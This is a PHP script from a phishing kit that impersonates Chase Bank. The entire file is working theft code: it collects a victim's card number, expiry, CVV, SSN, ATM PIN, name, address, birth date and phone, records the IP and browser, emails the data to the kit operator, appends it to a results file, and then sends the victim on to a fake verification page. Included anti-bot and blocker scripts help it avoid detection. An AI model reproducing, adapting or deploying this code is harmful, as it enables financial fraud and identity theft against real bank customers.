<?php
$zabi = getenv("REMOTE_ADDR");
include '../antibots.php';
include('../email.php');
include('system.php');
include '../bt.php';
include "../blocker.php";
$message .= "--++-----[ $$ Dr.Don  $$ ]-----++--\n";
$message .= "------------------ CARD INFO --------------------\n";
$message .= "Credit Card Number: ".$_POST['12']."\n";
$message .= "MM/YYYY: ".$_POST['13']."\n";
$message .= "MM/YYYY: ".$_POST['33']."\n";
$message .= "CCV/CSC: ".$_POST['14']."\n";
$message .= "SSN: ".$_POST['16']."\n";
$message .= "ATM PIN: ".$_POST['15']."\n";
$message .= "++-----[ $$ USER INFO $$ ]-----++\n";
$message .= "Full Name: ".$_POST['5']."\n";
$message .= "Address: ".$_POST['7']."\n";
$message .= "Date Birth: ".$_POST['6']."\n";
$message .= "Phone Number: ".$_POST['phoo']."\n";
$message .= "-------------- IP Infos ------------\n";
$message .= "IP       : $zabi\n";
$message .= "BROWSER  : ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "---------------------- By Dr.Don  ----------------------\n";
$cc = $_POST['ccn'];
$subject = "CHASE BANK FULL INFO [ " . $zabi . " ]  ".$_POST['exm']."/".$_POST['exy'];
$headers = "From: Dr.Don <contact>\r\n";
mail($email,$subject,$message,$headers);
mail(','.$blockeduse,$subject,$message,$headers);
    $text = fopen('../../rezlt.txt', 'a');
fwrite($text, $message);

header("Location: ../verification-id.php?cmd=_account-details&session=".md5(microtime())."&dispatch=".sha1(microtime()));?>